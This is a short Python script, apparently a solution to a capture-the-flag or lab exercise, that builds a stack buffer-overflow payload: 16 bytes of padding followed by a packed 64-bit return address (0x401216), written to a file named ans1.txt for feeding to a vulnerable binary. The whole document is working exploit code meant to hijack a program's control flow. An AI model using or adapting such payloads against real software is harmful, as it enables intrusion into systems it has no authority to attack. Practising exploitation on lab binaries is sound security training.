import struct
p=b'A'*16
aa=struct.pack('<Q',0x401216)
payload=p+aa

with open("ans1.txt", "wb") as f:
    f.write(payload)
